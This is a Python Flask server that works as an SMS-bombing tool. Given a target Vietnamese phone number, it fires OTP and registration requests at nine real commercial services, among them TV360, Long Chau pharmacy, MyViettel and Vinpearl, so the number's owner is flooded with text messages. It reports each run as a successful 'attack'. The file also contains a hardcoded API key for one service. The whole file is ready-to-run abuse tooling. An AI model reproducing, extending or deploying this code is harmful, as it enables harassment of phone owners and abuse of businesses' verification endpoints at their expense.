from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests
import re
import json
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

# ==================== CONFIG ====================
BLACKLIST = [
    '0123456789',
]

ACCESS_TOKENS = []


# ==================== MAIN CLASS ====================
class Main:
    @staticmethod
    def blacklist_check(sdt, check_type):
        if check_type in [1, 3]:
            if sdt in BLACKLIST:
                return True
        
        if check_type in [2, 3]:
            for phone in BLACKLIST:
                matches = sum(a == b for a, b in zip(sdt, phone))
                similarity = (matches / max(len(sdt), len(phone))) * 100
                if similarity > 85:
                    return True
        return False
    
    @staticmethod
    def check_sdt(sdt):
        pattern = r'^(09|08|07|03|05)\d{8}$'
        return not bool(re.match(pattern, sdt))
    
    @staticmethod
    def check_access_token(token):
        if not ACCESS_TOKENS:
            return True
        return token in ACCESS_TOKENS


# ==================== SPAM SMS CLASS ====================
class SpamSMS:
    def __init__(self, url, method, headers, body):
        self.url = url
        self.method = method
        self.headers = headers
        self.body = body
    
    def send(self, sdt):
        try:
            if isinstance(self.body, dict):
                body_str = json.dumps(self.body)
            else:
                body_str = self.body if self.body else ""
            
            body_str = body_str.replace('{{phone}}', sdt)
            url = self.url.replace('{{phone}}', sdt)
            
            headers_dict = {}
            for header in self.headers:
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers_dict[key.strip()] = value.strip()
            
            if self.method.upper() == 'POST':
                if body_str:
                    try:
                        body_json = json.loads(body_str)
                        response = requests.post(url, json=body_json, headers=headers_dict, timeout=30)
                    except json.JSONDecodeError:
                        response = requests.post(url, data=body_str, headers=headers_dict, timeout=30)
                else:
                    response = requests.post(url, headers=headers_dict, timeout=30)
            else:
                response = requests.get(url, headers=headers_dict, timeout=30)
            
            if 200 <= response.status_code < 300:
                return {
                    'status': 'success',
                    'msg': response.text[:200],
                    'code': response.status_code
                }
            else:
                return {
                    'status': 'error',
                    'msg': response.text[:200],
                    'code': response.status_code
                }
        
        except Exception as e:
            return {
                'status': 'error',
                'msg': str(e),
                'code': 0
            }


# ==================== API SERVICES ====================
SERVICES = {}

def add_api(name, service):
    SERVICES[name] = service


add_api('TV360', SpamSMS(
    "https://tv360.vn/public/v1/auth/get-otp-login",
    "POST",
    ["accept: application/json, text/plain, */*", "content-type: application/json"],
    {"msisdn": "{{phone}}"}
))

add_api('LongChau', SpamSMS(
    "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
    "POST",
    ["accept: application/json, text/plain, */*", "content-type: application/json"],
    {"phoneNumber": "{{phone}}", "otpType": 0, "fromSys": "WEBKHLC"}
))

add_api('MyViettel', SpamSMS(
    "https://vietteltelecom.vn/api/get-otp",
    "POST",
    ["accept: application/json, text/plain, */*", "content-type: application/json;charset=UTF-8"],
    '{"msisdn":"{{phone}}","type":"register"}'
))

add_api('Beautybox', SpamSMS(
    "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification",
    "POST",
    ["accept: application/json, text/plain, */*", "content-type: application/json", "key: 2c8ca1757e2203aa32d00c0f1a1ed353"],
    {"phoneNumber": "84{{phone}}"}
))

add_api('Batdongsan', SpamSMS(
    "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={{phone}}",
    "GET",
    ["accept: application/json, text/plain, */*"],
    None
))

add_api('Ghn', SpamSMS(
    "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
    "POST",
    ["accept: application/json, text/plain, */*", "content-type: application/json"],
    {"phone": "{{phone}}", "type": "register"}
))

add_api('Vinamilk', SpamSMS(
    "https://new.vinamilk.com.vn/api/account/getotp",
    "POST",
    ["accept: */*", "content-type: text/plain;charset=UTF-8", "authorization: Bearer null"],
    {"type": "register", "phone": "{{phone}}"}
))

add_api('Medicare', SpamSMS(
    "https://medicare.vn/api/otp",
    "POST",
    ["accept: application/json, text/plain, */*", "content-type: application/json"],
    {"mobile": "{{phone}}", "mobile_country_prefix": "84"}
))

add_api('Vinpearl', SpamSMS(
    "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
    "POST",
    ["accept: application/json", "content-type: application/json"],
    {"channel": "vpt", "username": "{{phone}}", "type": 1, "OtpChannel": 1}
))


# ==================== ROUTES ====================
@app.route('/')
def home():
    """Serve HTML homepage"""
    return send_file('index.html')


@app.route('/api', methods=['GET', 'POST'])
def api_endpoint():
    """API endpoint for SMS sending"""
    token = request.headers.get('X-WusTeam')
    if not Main.check_access_token(token):
        return jsonify({'status': 'error', 'msg': 'Invalid token authentication!'}), 403
    
    sdt = request.args.get('sdt', '').strip()
    sdt = re.sub(r'[^0-9]', '', sdt)
    
    if not sdt:
        return jsonify({'status': 'error', 'msg': 'Số điện thoại không được bỏ trống!'}), 400
    
    if Main.check_sdt(sdt):
        return jsonify({'status': 'error', 'msg': 'Vui lòng nhập số điện thoại hợp lệ!'}), 400
    
    if Main.blacklist_check(sdt, 2):
        return jsonify({'status': 'error', 'msg': 'Số điện thoại này hiện đang nằm trong danh sách đen!'}), 403
    
    results = {}
    success = 0
    failed = 0
    died = {}
    
    for name, service in SERVICES.items():
        result = service.send(sdt)
        results[name] = result
        
        if result['status'] == 'success':
            success += 1
        else:
            failed += 1
            died[name] = result['status']
    
    return jsonify({
        'r': {
            'status': 'success',
            'data': results,
            'res': {'success': success, 'failed': failed},
            'total': {'api': len(SERVICES)},
            'die': {'list': {failed: died}},
            'msg': f'Send attack successfully -> {sdt}'
        }
    })


@app.route('/health')
def health():
    """Health check"""
    return jsonify({
        'status': 'ok',
        'total_apis': len(SERVICES),
        'timestamp': datetime.now().isoformat()
    })


@app.route('/favicon.ico')
def favicon():
    return '', 204


# ==================== RUN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("=" * 50)
    print("🚀 SMS OTP API Server Starting...")
    print(f"📱 Total APIs loaded: {len(SERVICES)}")
    print(f"🌐 Server: http://localhost:{port}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)